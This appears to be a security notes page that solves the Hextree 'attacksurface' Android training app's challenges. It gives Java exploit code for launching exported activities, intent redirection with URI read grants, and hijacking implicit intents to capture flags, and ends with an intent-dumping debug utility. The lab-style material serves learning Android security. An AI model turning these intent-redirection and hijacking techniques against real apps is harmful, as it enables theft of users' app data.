---
description: >-
  A messaging object you can use to request an action from another app
  component.
---

# intent

## Intents exploitation

### Basic Intent

This code defines an `onClick` event that creates an explicit `Intent` to launch `Flag1Activity` within the `io.hextree.attacksurface` package when triggered.

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
    startActivity(intent);
}
```
{% endcode %}

### Intent with extras

This `onClick` event creates an explicit `Intent` to launch `Flag2Activity` within the `io.hextree.attacksurface` package, setting the action to `"io.hextree.action.GIVE_FLAG"` before starting the activity.

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
    intent.setAction("io.hextree.action.GIVE_FLAG");
    startActivity(intent);
}
```
{% endcode %}

### Intent with data URI

This `onClick` event creates an explicit `Intent` to launch `Flag3Activity` within the `io.hextree.attacksurface` package, setting the action to `"io.hextree.action.GIVE_FLAG"` and providing a data URI pointing to `"https://app.hextree.io/map/android"` before starting the activity.

<pre class="language-java" data-overflow="wrap"><code class="lang-java"><strong>public void onClick(View v) {
</strong>    Intent intent = new Intent();
    intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
    intent.setAction("io.hextree.action.GIVE_FLAG");
    intent.setData(Uri.parse("https://app.hextree.io/map/android"));
    startActivity(intent);
}
</code></pre>

### Multiple Intent calls

This `onClick` event sequentially launches `Flag4Activity` multiple times with different actions (`"PREPARE_ACTION"`, `"BUILD_ACTION"`, `"GET_FLAG_ACTION"`, `"INIT_ACTION"`), pausing for one second between each launch. Each `Intent` explicitly targets `Flag4Activity` within the `io.hextree.attacksurface` package to execute distinct actions in a specific order.

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent prepareIntent = new Intent();
    prepareIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
    prepareIntent.setAction("PREPARE_ACTION");
    startActivity(prepareIntent);

    try {
        Thread.sleep(1000);
    } catch (InterruptedException e) {
        throw new RuntimeException(e);
    }

    Intent buildIntent = new Intent();
    buildIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
    buildIntent.setAction("BUILD_ACTION");
    startActivity(buildIntent);

    try {
        Thread.sleep(1000);
    } catch (InterruptedException e) {
        throw new RuntimeException(e);
    }

    Intent getFlagIntent = new Intent();
    getFlagIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
    getFlagIntent.setAction("GET_FLAG_ACTION");
    startActivity(getFlagIntent);

    try {
        Thread.sleep(1000);
    } catch (InterruptedException e) {
        throw new RuntimeException(e);
    }

    Intent initIntent = new Intent();
    initIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
    initIntent.setAction("INIT_ACTION");
    startActivity(initIntent);
}
```
{% endcode %}

### Nested Intents (Intent in Intent)

This `onClick` event creates a chain of nested `Intents` to launch `Flag5Activity` in the `io.hextree.attacksurface` package. The primary `mainIntent` contains a nested `Intent` (`nestedIntent1`) with an extra key `"return"` set to `42`. Inside `nestedIntent1`, another `Intent` (`nestedIntent2`) is nested with an extra `"reason"` set to `"back"`. This structured setup initiates `Flag5Activity` with a chain of `Intents` for conditional processing.

```java
public void onClick(View v) {
    Intent mainIntent = new Intent();
    mainIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));

    Intent nestedIntent1 = new Intent();
    nestedIntent1.putExtra("return", 42);

    Intent nestedIntent2 = new Intent();
    nestedIntent2.putExtra("reason", "back");

    nestedIntent1.putExtra("nextIntent", nestedIntent2);

    mainIntent.putExtra("android.intent.extra.INTENT", nestedIntent1);

    startActivity(mainIntent);
}
```

### Intent Redirect (Intent Forwarding)

This `onClick` event constructs a series of nested `Intents` to initiate `Flag5Activity` in the `io.hextree.attacksurface` package. The main `Intent`, `mainIntent`, includes a nested `Intent` (`nestedIntent1`) with an extra key `"return"` set to `42`. Inside `nestedIntent1`, a secondary nested `Intent` (`nestedIntent2`) is configured to start `Flag6Activity`, with extras `"reason"` set to `"next"` and the flag `FLAG_GRANT_READ_URI_PERMISSION`. This layered structure directs `Flag5Activity` to process `nestedIntent1` and, conditionally, initiate `Flag6Activity`.

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent mainIntent = new Intent();
    mainIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));

    Intent nestedIntent1 = new Intent();
    nestedIntent1.putExtra("return", 42);

    Intent nestedIntent2 = new Intent();
    nestedIntent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
    nestedIntent2.putExtra("reason", "next");
    nestedIntent2.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

    nestedIntent1.putExtra("nextIntent", nestedIntent2);

    mainIntent.putExtra("android.intent.extra.INTENT", nestedIntent1);

    startActivity(mainIntent);
}
```
{% endcode %}

### Intent activity lifecycle

This `onClick` event sequentially launches `Flag7Activity` in the `io.hextree.attacksurface` package with two distinct actions. First, it starts `Flag7Activity` with the `"OPEN"` action. After a one-second pause, it launches `Flag7Activity` again with the `"REOPEN"` action, adding the `FLAG_ACTIVITY_SINGLE_TOP` flag to prevent creating a new instance if `Flag7Activity` is already at the top of the activity stack.

```java
public void onClick(View v) {
    Intent openIntent = new Intent();
    openIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
    openIntent.setAction("OPEN");
    startActivity(openIntent);

    try {
        Thread.sleep(1000);
    } catch (InterruptedException e) {
        throw new RuntimeException(e);
    }

    Intent reopenIntent = new Intent();
    reopenIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
    reopenIntent.setAction("REOPEN");
    reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
    startActivity(reopenIntent);
}
```

### Intent returning Activity results

`HextreeLauncherActivity` displays a button that, when clicked, launches `Flag8Activity` using `startActivityForResult` to enable it to verify the calling activity’s identity. If `Flag8Activity` returns a result, `onActivityResult` can optionally handle it.

```java
public class HextreeLauncherActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hextree_launcher);

        // Set up the button listener to launch Flag8Activity
        Button launchButton = findViewById(R.id.launchFlag8Button);
        launchButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                launchFlag8Activity();
            }
        });
    }

    public void launchFlag8Activity() {
        // Create an explicit Intent to launch Flag8Activity
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));
        startActivityForResult(intent, 1); // Use startActivityForResult to ensure getCallingActivity works in Flag8Activity
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Optionally, handle any returned result from Flag8Activity here
    }
}
```

### Intent returning Activity results + conditions

`HextreeLauncherActivity` displays a button that, when clicked, launches `Flag9Activity` to request a flag. Once `Flag9Activity` returns, `HextreeLauncherActivity` retrieves and displays the flag via a `Toast` message if the result is successful.

```java
public class HextreeLauncherActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hextree_launcher);

        // Set up the button listener to launch Flag8Activity
        Button launchButton = findViewById(R.id.launchFlag8Button);
        launchButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                launchFlag9Activity();
            }
        });
    }

    public void launchFlag9Activity() {
        // Create an explicit Intent to launch Flag9Activity
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity"));
        startActivityForResult(intent, 1); // Use startActivityForResult to ensure getCallingActivity works in Flag9Activity
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 1 && resultCode == Activity.RESULT_OK && data != null) {
            // Retrieve the flag from the intent data
            String flag = data.getStringExtra("flag");
            if (flag != null) {
                // Display the flag using a Toast or any preferred method
                Toast.makeText(this, "Received flag: " + flag, Toast.LENGTH_LONG).show();
            }
        }
    }
}
```

### Hijack Implicit Intents

Manifest.xml

<pre class="language-xml"><code class="lang-xml">&#x3C;activity
    android:name=".SecondActivity"
    android:exported="true">
<strong>    &#x3C;intent-filter>
</strong>        &#x3C;action android:name="io.hextree.attacksurface.ATTACK_ME"/>
        &#x3C;category android:name="android.intent.category.DEFAULT" />
    &#x3C;/intent-filter>
&#x3C;/activity>
</code></pre>

`SecondActivity` listens for an implicit intent with the action `"io.hextree.attacksurface.ATTACK_ME"`. When launched, it retrieves a flag from the intent’s extras, displays it with a `Toast`, and returns a result if needed before finishing.

{% code overflow="wrap" %}
```java
public class SecondActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Check if the intent action matches the expected action
        Intent intent = getIntent();
        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
            // Retrieve the flag from the intent's extras
            String flag = intent.getStringExtra("flag");

            if (flag != null) {
                // Display the flag using a Toast
                Toast.makeText(this, "Received flag: " + flag, Toast.LENGTH_LONG).show();

                // Optionally, send a result back if needed
                Intent resultIntent = new Intent();
                resultIntent.putExtra("received_flag", flag);
                setResult(Activity.RESULT_OK, resultIntent);
            } else {
                Toast.makeText(this, "Flag not found in intent", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "Incorrect intent action", Toast.LENGTH_SHORT).show();
        }

        finish();
    }
}
```
{% endcode %}

### Hijack Implicit Intents (+ respond a specific result)

`SecondActivity` listens for an implicit intent with the action `"io.hextree.attacksurface.ATTACK_ME"`. Upon receiving it, the activity creates a result intent containing a specific token (`1094795585`) and returns it to the calling activity, then finishes.

```java
public class SecondActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
            Intent resultIntent = new Intent();
            resultIntent.putExtra("token", 1094795585);
            setResult(RESULT_OK, resultIntent);
            finish();
        }

        finish();
    }
}
```

## Utils

Java class for debug

```java
// package io.hextree.activitiestest;

import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.Set;

public class Utils {
    public static String dumpIntent(Context context, Intent intent) {
        return dumpIntent(context, intent, 0);
    }

    private static String dumpIntent(Context context, Intent intent, int indentLevel) {
        if (intent == null) {
            return "Intent is null";
        }

        StringBuilder sb = new StringBuilder();
        String indent = new String(new char[indentLevel]).replace("\0", "    ");

        // Append basic intent information
        sb.append(indent).append("[Action]    ").append(intent.getAction()).append("\n");
        // Append categories
        Set<String> categories = intent.getCategories();
        if (categories != null) {
            for (String category : categories) {
                sb.append(indent).append("[Category]  ").append(category).append("\n");
            }
        }
        sb.append(indent).append("[Data]      ").append(intent.getDataString()).append("\n");
        sb.append(indent).append("[Component] ").append(intent.getComponent()).append("\n");
        sb.append(indent).append("[Flags]     ").append(getFlagsString(intent.getFlags())).append("\n");


        // Append extras
        Bundle extras = intent.getExtras();
        if (extras != null) {
            for (String key : extras.keySet()) {
                Object value = extras.get(key);
                if (value instanceof Intent) {
                    sb.append(indent).append("[Extra:'").append(key).append("'] -> Intent\n");
                    // Recursively dump nested intents with increased indentation
                    sb.append(dumpIntent(context, (Intent) value, indentLevel + 1));  
                } else if (value instanceof Bundle) {
                    sb.append(indent).append("[Extra:'").append(key).append("'] -> Bundle\n");
                    // Recursively dump nested intents with increased indentation
                    sb.append(dumpBundle((Bundle) value, indentLevel + 1));
                } else {
                    sb.append(indent).append("[Extra:'").append(key).append("']: ").append(value).append("\n");
                }
            }
        }

        // Query the content URI if FLAG_GRANT_READ_URI_PERMISSION is set
        /*
        if ((intent.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION) != 0) {
            Uri data = intent.getData();
            if (data != null) {
                sb.append(queryContentUri(context, data, indentLevel + 1));
            }
        }
        */

        return sb.toString();
    }
    
    public static String dumpBundle(Bundle bundle) {
        return dumpBundle(bundle, 0);
    }

    private static String dumpBundle(Bundle bundle, int indentLevel) {
        if (bundle == null) {
            return "Bundle is null";
        }

        StringBuilder sb = new StringBuilder();
        String indent = new String(new char[indentLevel]).replace("\0", "    ");

        for (String key : bundle.keySet()) {
            Object value = bundle.get(key);
            if (value instanceof Bundle) {
                sb.append(String.format("%s['%s']: Bundle[\n%s%s]\n", indent, key, dumpBundle((Bundle) value, indentLevel + 1), indent));
            } else {
                sb.append(String.format("%s['%s']: %s\n", indent, key, value != null ? value.toString() : "null"));
            }
        }
        return sb.toString();
    }

    private static String getFlagsString(int flags) {
        StringBuilder flagBuilder = new StringBuilder();
        if ((flags & Intent.FLAG_GRANT_READ_URI_PERMISSION) != 0) flagBuilder.append("GRANT_READ_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) != 0) flagBuilder.append("GRANT_WRITE_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION) != 0) flagBuilder.append("GRANT_PERSISTABLE_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_GRANT_PREFIX_URI_PERMISSION) != 0) flagBuilder.append("GRANT_PREFIX_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_ACTIVITY_NEW_TASK) != 0) flagBuilder.append("ACTIVITY_NEW_TASK | ");
        if ((flags & Intent.FLAG_ACTIVITY_SINGLE_TOP) != 0) flagBuilder.append("ACTIVITY_SINGLE_TOP | ");
        if ((flags & Intent.FLAG_ACTIVITY_NO_HISTORY) != 0) flagBuilder.append("ACTIVITY_NO_HISTORY | ");
        if ((flags & Intent.FLAG_ACTIVITY_CLEAR_TOP) != 0) flagBuilder.append("ACTIVITY_CLEAR_TOP | ");
        if ((flags & Intent.FLAG_ACTIVITY_FORWARD_RESULT) != 0) flagBuilder.append("ACTIVITY_FORWARD_RESULT | ");
        if ((flags & Intent.FLAG_ACTIVITY_PREVIOUS_IS_TOP) != 0) flagBuilder.append("ACTIVITY_PREVIOUS_IS_TOP | ");
        if ((flags & Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS) != 0) flagBuilder.append("ACTIVITY_EXCLUDE_FROM_RECENTS | ");
        if ((flags & Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT) != 0) flagBuilder.append("ACTIVITY_BROUGHT_TO_FRONT | ");
        if ((flags & Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED) != 0) flagBuilder.append("ACTIVITY_RESET_TASK_IF_NEEDED | ");
        if ((flags & Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) != 0) flagBuilder.append("ACTIVITY_LAUNCHED_FROM_HISTORY | ");
        if ((flags & Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET) != 0) flagBuilder.append("ACTIVITY_CLEAR_WHEN_TASK_RESET | ");
        if ((flags & Intent.FLAG_ACTIVITY_NEW_DOCUMENT) != 0) flagBuilder.append("ACTIVITY_NEW_DOCUMENT | ");
        if ((flags & Intent.FLAG_ACTIVITY_NO_USER_ACTION) != 0) flagBuilder.append("ACTIVITY_NO_USER_ACTION | ");
        if ((flags & Intent.FLAG_ACTIVITY_REORDER_TO_FRONT) != 0) flagBuilder.append("ACTIVITY_REORDER_TO_FRONT | ");
        if ((flags & Intent.FLAG_ACTIVITY_NO_ANIMATION) != 0) flagBuilder.append("ACTIVITY_NO_ANIMATION | ");
        if ((flags & Intent.FLAG_ACTIVITY_CLEAR_TASK) != 0) flagBuilder.append("ACTIVITY_CLEAR_TASK | ");
        if ((flags & Intent.FLAG_ACTIVITY_TASK_ON_HOME) != 0) flagBuilder.append("ACTIVITY_TASK_ON_HOME | ");
        if ((flags & Intent.FLAG_ACTIVITY_RETAIN_IN_RECENTS) != 0) flagBuilder.append("ACTIVITY_RETAIN_IN_RECENTS | ");
        if ((flags & Intent.FLAG_ACTIVITY_LAUNCH_ADJACENT) != 0) flagBuilder.append("ACTIVITY_LAUNCH_ADJACENT | ");
        if ((flags & Intent.FLAG_ACTIVITY_REQUIRE_DEFAULT) != 0) flagBuilder.append("ACTIVITY_REQUIRE_DEFAULT | ");
        if ((flags & Intent.FLAG_ACTIVITY_REQUIRE_NON_BROWSER) != 0) flagBuilder.append("ACTIVITY_REQUIRE_NON_BROWSER | ");
        if ((flags & Intent.FLAG_ACTIVITY_MATCH_EXTERNAL) != 0) flagBuilder.append("ACTIVITY_MATCH_EXTERNAL | ");
        if ((flags & Intent.FLAG_ACTIVITY_MULTIPLE_TASK) != 0) flagBuilder.append("ACTIVITY_MULTIPLE_TASK | ");
        if ((flags & Intent.FLAG_RECEIVER_REGISTERED_ONLY) != 0) flagBuilder.append("RECEIVER_REGISTERED_ONLY | ");
        if ((flags & Intent.FLAG_RECEIVER_REPLACE_PENDING) != 0) flagBuilder.append("RECEIVER_REPLACE_PENDING | ");
        if ((flags & Intent.FLAG_RECEIVER_FOREGROUND) != 0) flagBuilder.append("RECEIVER_FOREGROUND | ");
        if ((flags & Intent.FLAG_RECEIVER_NO_ABORT) != 0) flagBuilder.append("RECEIVER_NO_ABORT | ");
        if ((flags & Intent.FLAG_RECEIVER_VISIBLE_TO_INSTANT_APPS) != 0) flagBuilder.append("RECEIVER_VISIBLE_TO_INSTANT_APPS | ");

        if (flagBuilder.length() > 0) {
            // Remove the trailing " | "
            flagBuilder.setLength(flagBuilder.length() - 3);
        }

        return flagBuilder.toString();
    }

    public static void showDialog(Context context, Intent intent) {
        if(intent == null) return;
        // Create the dialog
        Dialog dialog = new Dialog(context);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setCancelable(true);

        // Create a LinearLayout to hold the dialog content
        LinearLayout layout = new LinearLayout(context);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 50, 20, 50);
        layout.setBackgroundColor(0xffefeff5);


        // Add a TextView for the title
        TextView title = new TextView(context);
        title.setText("Intent Details: ");
        title.setTextSize(16);
        title.setTextColor(0xff000000);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setPadding(0, 0, 0, 40);
        title.setGravity(Gravity.CENTER);
        title.setBackgroundColor(0xffefeff5);
        layout.addView(title);

        // Add a TextView for the message
        TextView message = new TextView(context);
        message.setText(dumpIntent(context, intent));
        message.setTypeface(Typeface.MONOSPACE);
        message.setTextSize(12);
        message.setTextColor(0xff000000);
        message.setPadding(0, 0, 0, 30);
        message.setGravity(Gravity.START);
        message.setBackgroundColor(0xffefeff5);
        layout.addView(message);

        // Add an OK button
        Button positiveButton = new Button(context);
        positiveButton.setText("OK");
        positiveButton.setTextColor(0xff000000);
        positiveButton.setOnClickListener(v -> dialog.dismiss());
        layout.addView(positiveButton);

        // Set the layout as the content view of the dialog
        dialog.setContentView(layout);

        // Adjust dialog window parameters to make it fullscreen
        Window window = dialog.getWindow();
        if (window != null) {
            window.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            window.setBackgroundDrawableResource(android.R.color.transparent);
            WindowManager.LayoutParams wlp = window.getAttributes();
            wlp.gravity = Gravity.BOTTOM;
            wlp.flags &= ~WindowManager.LayoutParams.FLAG_DIM_BEHIND;
            window.setAttributes(wlp);
        }

        dialog.show();
        // Animate the dialog with a slide-in effect
        layout.setTranslationY(2000); // Start off-screen to the right
        layout.setAlpha(0f);
        ObjectAnimator translateYAnimator = ObjectAnimator.ofFloat(layout, "translationY", 0);
        ObjectAnimator alphaAnimator = ObjectAnimator.ofFloat(layout, "alpha", 1f);
        AnimatorSet animatorSet = new AnimatorSet();
        animatorSet.playTogether(translateYAnimator, alphaAnimator);
        animatorSet.setDuration(300); // Duration of the animation
        animatorSet.setStartDelay(100); // Delay before starting the animation
        animatorSet.start();
    }
}
```

## References

{% embed url="https://developer.android.com/guide/components/intents-filters?hl=es-419" %}

{% embed url="https://app.hextree.io/" %}
